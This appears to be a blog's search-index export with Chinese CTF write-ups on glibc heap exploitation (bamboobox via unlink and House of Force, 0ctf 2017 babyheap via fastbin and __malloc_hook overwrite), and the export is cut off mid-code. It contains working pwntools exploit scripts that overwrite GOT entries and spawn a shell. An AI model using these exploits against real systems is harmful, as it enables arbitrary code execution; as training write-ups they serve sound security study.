<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUU-hitcontraining_bamboobox</title>
    <link href="/2022/09/01/BUU-hitcontraining-bamboobox/"/>
    <url>/2022/09/01/BUU-hitcontraining-bamboobox/</url>
    
    <content type="html"><![CDATA[<p>Unlink在做完<code>stkof</code>后仍是有点理解问题，这题较<code>sktof</code>简单些，正好拿来巩固了一下unlink。虽说是做出来了，但是原题是<code>House of Force</code>的例题，顺便也记录一下。</p><span id="more"></span><h1 id="BUU-hitcontraining-bamboobox"><a href="#BUU-hitcontraining-bamboobox" class="headerlink" title="BUU-hitcontraining_bamboobox"></a>BUU-hitcontraining_bamboobox</h1><p>因为Buu的flag无法用给定的magic函数获取，所以只能多走几步，通过获取shell来get flag</p><p><img src="/img/image-20220901173046870.png" alt="checksec"></p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h3><p>add_item流程：1、获取item_name长度 2、在itemlist记录item_name和chunk_addr</p><p><img src="/img/image-20220901173643685.png" alt="image-20220901173643685"></p><h3 id="change-item"><a href="#change-item" class="headerlink" title="change_item"></a>change_item</h3><p>允许输入任意长数据，存在堆溢出</p><p><img src="/img/image-20220901174104795.png" alt="image-20220901174104795"></p><h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h3><p>无UAF</p><h2 id="exp1-Unlink"><a href="#exp1-Unlink" class="headerlink" title="exp1 Unlink"></a>exp1 Unlink</h2><p>程序仅利用itemlist来记录chunk情况且got表可改写，考虑修改itemlist处指针的指向。利用Unlink修改content_addr处为atoi.got地址，修改got表项为system后键入<code>/bin/sh\x00</code>获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p = process(<span class="hljs-string">&quot;bamboobox&quot;</span>)<br>elf= ELF(<span class="hljs-string">&#x27;./bamboobox&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;ubuntu16_x64.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>gdb.attach(p)<br>pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,payload</span>):<br>p.recvuntil(<span class="hljs-string">b&quot;Your choice:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Please enter the length of item name:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">b&quot;Please enter the name of item:&quot;</span>)<br>p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>p.recvuntil(<span class="hljs-string">b&quot;Your choice:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">idx,size,payload</span>):<br>p.recvuntil(<span class="hljs-string">b&quot;Your choice:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Please enter the index of item:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">b&#x27;Please enter the length of item name:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">b&quot;Please enter the new name of the item:&quot;</span>)<br>p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">b&quot;Your choice:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Please enter the index of item:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x16</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#无用chunk malloc出来玩的=.=</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>) <span class="hljs-comment">#被unlink的chunk</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#触发unlink的chunk</span><br><br>target = <span class="hljs-number">0x6020d8</span> <span class="hljs-comment">#itemlist chunk1 content_addr</span><br>fake_fd = target - <span class="hljs-number">0x18</span> <span class="hljs-comment">#绕过unlink判定</span><br>fake_bk = target - <span class="hljs-number">0x10</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0x31</span>) + p64(fake_fd) + p64(fake_bk) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span><br><span class="hljs-comment">#payload = fake_presize + fake_size + fake_fd + fake_bk + padding</span><br>payload+= p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)<br><span class="hljs-comment">#payload += presize(fake) + size 堆溢出构造unlink条件</span><br>change(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>dele(<span class="hljs-number">2</span>) <span class="hljs-comment">#触发unlink</span><br><span class="hljs-comment">#unlink结果：itemlist中chunk1的content_addr修改为了itemlist[0]地址</span><br>atoi_got = elf.got[<span class="hljs-string">&quot;atoi&quot;</span>]<br>payload = p64(<span class="hljs-number">0x16</span>) + p64(atoi_got)<br>change(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<span class="hljs-comment">#修改chunk0的content_addr为atoi.got地址</span><br>show() <br>p.recvuntil(<span class="hljs-string">b&quot;0 : &quot;</span>)<br>atoi_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>success(<span class="hljs-string">&quot;atoi_addr:&quot;</span>+<span class="hljs-built_in">hex</span>(atoi_addr))<br><span class="hljs-comment">#泄露libc基址</span><br>libc_base = atoi_addr - libc.symbols[<span class="hljs-string">&quot;atoi&quot;</span>]<br>system_addr=libc_base + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system_addr) )<br><span class="hljs-comment">#修改atoi.got表项为system地址</span><br>payload=p64(system_addr)<br><span class="hljs-comment">#利用atoi获取shell</span><br>change(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cat flag&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="before-unlink"><a href="#before-unlink" class="headerlink" title="before unlink"></a>before unlink</h3><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-01%20185628.png" alt="parseheap"></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-01%20190225.png" alt="itemlist"></p><h3 id="after-unlink"><a href="#after-unlink" class="headerlink" title="after unlink"></a>after unlink</h3><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-01%20190443.png" alt="parseheap"></p><p><img src="/img/image-20220901191251286.png" alt="itemlist"></p><h3 id="after-change"><a href="#after-change" class="headerlink" title="after change"></a>after change</h3><p><img src="/img/image-20220901191504206.png" alt="itemlist"></p><p>修改了chunk0处chunk_addr的指针指向。因为如下语句<code>0x6020d0</code>处的字节被置为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*(*&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] + read(<span class="hljs-number">0</span>, *&amp;itemlist[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>], v2)) = <span class="hljs-number">0</span>;<span class="hljs-comment">// 堆溢出</span><br></code></pre></td></tr></table></figure><h3 id="泄露基地址及修改got表"><a href="#泄露基地址及修改got表" class="headerlink" title="泄露基地址及修改got表"></a>泄露基地址及修改got表</h3><p><img src="/img/image-20220901192048246.png" alt="image-20220901192048246"></p><p><img src="/img/image-20220901192243604.png" alt="image-20220901192243604"></p><h2 id="exp2-house-of-force"><a href="#exp2-house-of-force" class="headerlink" title="exp2 house of force"></a>exp2 house of force</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">magic_addr = <span class="hljs-number">0x400d49</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>)<br><br>payload = <span class="hljs-number">0x28</span>*<span class="hljs-string">b&#x27;b&#x27;</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br><br>change(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,payload)<br><br><span class="hljs-comment">#top_chunk=0x212f040, target=0x212f018, top_chunk_target=0x212f000(需要是MALLOC_ALIGN倍数)</span><br><span class="hljs-comment">#offset =0x40 即((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) == -0x50</span><br>req = -<span class="hljs-number">0x50</span> - <span class="hljs-number">15</span> - <span class="hljs-number">8</span><br>p.recvuntil(<span class="hljs-string">b&quot;Your choice:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Please enter the length of item name:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(req))<br>p.recvuntil(<span class="hljs-string">b&quot;Please enter the name of item:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;zzzz&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(magic_addr) * <span class="hljs-number">2</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="after-change-1"><a href="#after-change-1" class="headerlink" title="after change"></a>after change</h3><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-02%20162628.png" alt="屏幕截图 2022-09-02 162628"></p><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-02%20170139.png" alt="屏幕截图 2022-09-02 170139"></p><p>再次malloc获取0x23ad018的控制权限，写入后门地址，获取flag</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>在实现house of force时，read函数理论上读取了<code>zzzz\n</code>写入到<code>0x23ad060</code>位置。在动态调试时程序确实执行了这一操作，但是结果并未往目标位置写入内容</p></li><li><p>wiki上的exp中第一次malloc的大小为<code>0x30</code>，其house of force的偏移值计算为<code>-(0x60+ 0xf+ 0x8)</code>。</p><p>理论上当第一次malloc的大小为<code>0x10</code>时，偏移值计算为<code>-(0x40+ 0xf+ 0x8)</code>，此时<code>top chunk</code>大小为<code>0x38</code>，仍然可以分配出<code>0x20</code>控制target。但是在实现过程当中，程序在<code>malloc(-(0x40+ 0xf+ 0x8))</code>后将无法继续运行。</p></li></ul><p>感觉HOF所需的前置条件有些苛刻，过程也不如前些方法来得可控(?)，希望过些时间能把问题弄清楚吧.</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>heap</tag>
      
      <tag>buu刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>babyheap_0ctf_2017做题记录</title>
    <link href="/2022/07/25/babyheap-0ctf-2017%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/07/25/babyheap-0ctf-2017%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>第一次做堆题，研究了好一会，最后还是在libc的one_gadget部分留下了一些疑点(很有可能是自己的libc替换操作问题？)，希望过些时候能理解清楚。</p><span id="more"></span><h1 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017_0ctf_babyheap"></a>2017_0ctf_babyheap</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>遇上了glibc版本不匹配的问题，学习了一下<code>patchelf</code>以及<code>glibc_all_in_one</code>的使用。</p><p>函数漏洞主要是在Fill函数中填充数据大小没有和chunk大小做对比，存在堆溢出</p><p>主体思路：通过多种方法泄露libc基址，然后用<code>arbitrary alloc</code>将chunk分配到<code>__malloc_hook</code>附近，使用Fill函数覆盖 <code>__malloc_hook</code>在该位置处构造ROP链。因为malloc会调用<code>__malloc_hook</code>，所以调用malloc时会自动跳转执行ROP链</p><p><strong>大致过程</strong>：</p><p>泄露libc基地址构造ROP链</p><p>因为开启aslr所以libc的基址会发生变化。采取<code>unsorted bin leak</code>泄露<code>main_arena</code>地址进而计算。通过ida查看libc中<code>malloc_trim</code>函数中<code>main_arena</code>相对于libc的偏移值。</p><p>下图为buu的ubuntu16中malloc_trim片段，可以看出<code>main_arena</code>的偏移地址为<code>0x3C4B20</code>(看了一下wiki计算基址的另外一种方法，直接dump出<code>malloc_hook</code>偏移值进而+0x10获取基址，貌似也可行)</p><p><img src="/img/image-20220722194222164.png" alt="0x1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span> <span class="hljs-comment">#wiki上获取基址的方法 </span><br></code></pre></td></tr></table></figure><h2 id="方法一：双指针指向small-chunk"><a href="#方法一：双指针指向small-chunk" class="headerlink" title="方法一：双指针指向small_chunk"></a>方法一：双指针指向small_chunk</h2><p><strong>首先试一下<a href="https://bbs.pediy.com/thread-268200.htm">看雪老哥</a>的方法，同时也是wiki的方法</strong> </p><ol><li><p>泄露libc基地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#用以修改chunk1的值</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#用以辅助chunk2指向chunk4(构造fastbinsY单向链表)</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#用以指向chunk4的内容</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#用以修改chunk4的值</span><br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment"># small bin</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<span class="hljs-comment">#fastbin[0] -&gt; babychunk1 -&gt; babychunk2 &lt;- 0x0</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220723210043156.png" alt="0x2"></p><blockquote><p> 分别往babychunk0和babychunk3填充数据。</p><ul><li>对于babychunk0，首先填充完它自己的user data部分，然后填充babychunk1使得babychunk1的fd指针的最后一字节变成0x80，也就是使得babychunk4取代babychunk2在fastbin里的位置。</li><li>对于babychunk3，首先填充完它自己的user data部分，然后填充babychunk4，使得babychunk4的size变成0x20。</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-number">0x10</span> * <span class="hljs-string">&#x27;a&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload), payload) <span class="hljs-comment">#fastbin[0] -&gt; babychunk1 -&gt; babychunk4&lt;- 0x0</span><br><span class="hljs-comment">#这里之所以能够直接send 0x80 以修改fastbin1的fd为chunk4是因为:</span><br><span class="hljs-comment">#堆的地址始终是 4KB 对齐的,第四个chunk的起始地址的首个字节必为0x80.</span><br>payload = <span class="hljs-number">0x10</span> * <span class="hljs-string">&#x27;a&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(payload), payload) <span class="hljs-comment">#填充smallchunk，修改chunk_size 为 fastbin_size</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220723214017768.png" alt="0x3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#重新分配被free掉的chunk</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#content指针指向被free掉的chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#content指针指向smallchunk的content地址</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220723214419849.png" alt="0x4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#重新设置smallchunk的size为0x91</span><br>payload = <span class="hljs-number">0x10</span> * <span class="hljs-string">&#x27;a&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(payload), payload)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220723214632928.png" alt="0x5"></p><blockquote><p> 分配一个新的0x90大小的babychunk5，目的是为了<strong>防止紧接着free的babychunk4和top chunk合并</strong>。</p></blockquote><p>allocate了一个chunk5后，free babychunk4使得babychun4进入unsortedbin，此时babychunk4的fd和bk都指向（main_arena+88）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x80</span>) <br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220723230203073.png" alt="0x6"></p><p>利用dump选项泄漏babychunk4的fd（main_arena+88），计算libc基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">dump(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: \n&quot;</span>)<br>arena_addr = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">88</span><br>main_arena_offset = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span> <span class="hljs-comment">#wiki上获取基址的方法 </span><br>libc_base = arena_addr - main_arena_offset<br></code></pre></td></tr></table></figure></li><li><p>实施<code>arbitrary alloc</code></p><p>将chunk分配到__malloc_hook附近</p><p><img src="/img/image-20220724030049259.png" alt="0x7"></p><p>经过调试可得fake_chunk的size地址应为<code>0x7f7c95dceaf0 + 0x5</code> ，即fake_chunk的地址应为<code>main_arena - 0x2b - 0x8</code>(因为每次地址随机，所以采用相对寻址)</p><blockquote><p>根据chunk的size计算其在fastbin数组中index的宏如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></td></tr></table></figure><p>那么，64位程序：0x7f&#x2F;16-2&#x3D;5。所以0x7f对应的fastbin单链表要求的size为0x70，user data部分的size为0x60。</p></blockquote><p>先构造实现fake_chunk的条件，创造一个fastbin并改写他的fd值使其指向fake_chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220724004836041.png" alt="0x8"></p><p>通过上图可以分析得: 原本被free掉的small_chunk被分割成了两个部分，前半部分为0x70(fast_bin)，后半部分为0x20(unsorted_bin)。因此方才指向chunk4 content的指针还可以使用，直接通过Fill chunk2填充被分割而得来的新fastbin的fd，使其指向fake_chunk地址。紧接着alloc两个chunk，第一个获得改写过fd的chunk4，第二个获取<code>__malloc_hook</code>附近的chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk_addr = main_arena - <span class="hljs-number">0x2b</span> - <span class="hljs-number">0x8</span><br>fake_chunk = p64(fake_chunk_addr)<br>fill(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(fake_chunk), fake_chunk)<br>alloc(<span class="hljs-number">0x60</span>)<br><span class="hljs-comment">#gdb() 具体情况如下图所示</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#在此处gdb发现被alloc的chunk并不能在parseheap中显示</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220724031232617.png" alt="0x9"></p><p>最后写入ROP链并执行，理论上就打通了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">one_gadget_addr = libc_base + <span class="hljs-number">0x4527a</span><br>payload = <span class="hljs-number">0x13</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)<br>fill(<span class="hljs-number">6</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>allocate(<span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p>实际操作中打不通，看了wiki和其他师傅的wp后发现只要将<code>0x4527a</code>改成<code>0x4526a</code>就打通了，(如图为我的one_gadget结果，使用的是all_in_one中的2.23-0ubuntu11.3_amd64)</p><p><img src="/img/image-20220724033857414.png" alt="0xa"></p><p>用了buuctf的<code>libc-2.23.so</code>看了一下。但是使用了buu给的libc之后本地仍然打不通…</p><p><img src="/img/image-20220724040122446.png" alt="0xb"></p></li></ol><h2 id="方法二：通过chunk重叠泄露"><a href="#方法二：通过chunk重叠泄露" class="headerlink" title="方法二：通过chunk重叠泄露"></a>方法二：通过chunk重叠泄露</h2><p><a href="https://blog.csdn.net/qq_29343201/article/details/66476135">参考网址</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//目标构造结果                             chunk 1 ends here ----+</span><br>          |------    ------  fake_chunk(<span class="hljs-number">0x70</span>)   ------    ------|<br>          v                                                     v<br>+---------+-----------+----------------+---------------+--------+-----<br>| chunk0  | new chunk1|                |  chunk2 head  | libc!  |  next size<br>| <span class="hljs-number">0x60</span>    |head(<span class="hljs-number">0x10</span>) | content <span class="hljs-number">0x40</span>   |               | (fd,bk)| (be valid size)<br>+---------+-----------+----------------+---------------+-------------     <br></code></pre></td></tr></table></figure><ol><li><p>allocate chunk为leak做准备</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#用作修改之后分配的chunk</span><br>allocate(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#构造一个fastbin类的chunk1用作最终泄露的chunk</span><br>allocate(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#构造一个smallbin类的chunk2用以泄露地址</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220725203007401.png" alt="0xc"></p></li><li><p>通过堆溢出修改chunk1的size(大小必须在fastbin范围之内)，此处size修改为0x70</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload) <span class="hljs-comment">#堆溢出修改chunk1_size构成重叠的chunk</span><br></code></pre></td></tr></table></figure></li><li><p>修改chunk2中fake_chunk中nextsize，用以通过free fastbin时的检查(以下为<code>_int_free 2.23</code>部分源码)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//因为要将其分配到fastbin所以需要接受以下判断</span><br><span class="hljs-keyword">if</span> (__builtin_expect(   <span class="hljs-comment">//检查后面的chunk的size是否大于2*SIZE_SZ</span><br>      chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>            __builtin_expect(  <span class="hljs-comment">//检查下一个chunk的size不大于sys_mem</span><br>                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-comment">/* We might not have a lock at this point and concurrent</span><br><span class="hljs-comment">               modifications</span><br><span class="hljs-comment">               of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">               after getting the lock.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock || (&#123;<br>                    assert(locked == <span class="hljs-number">0</span>);<br>                    __libc_lock_lock(av-&gt;mutex);<br>                    locked = <span class="hljs-number">1</span>;<br>                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ ||<br>                        chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;<br>                &#125;)) &#123;<br>                errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>                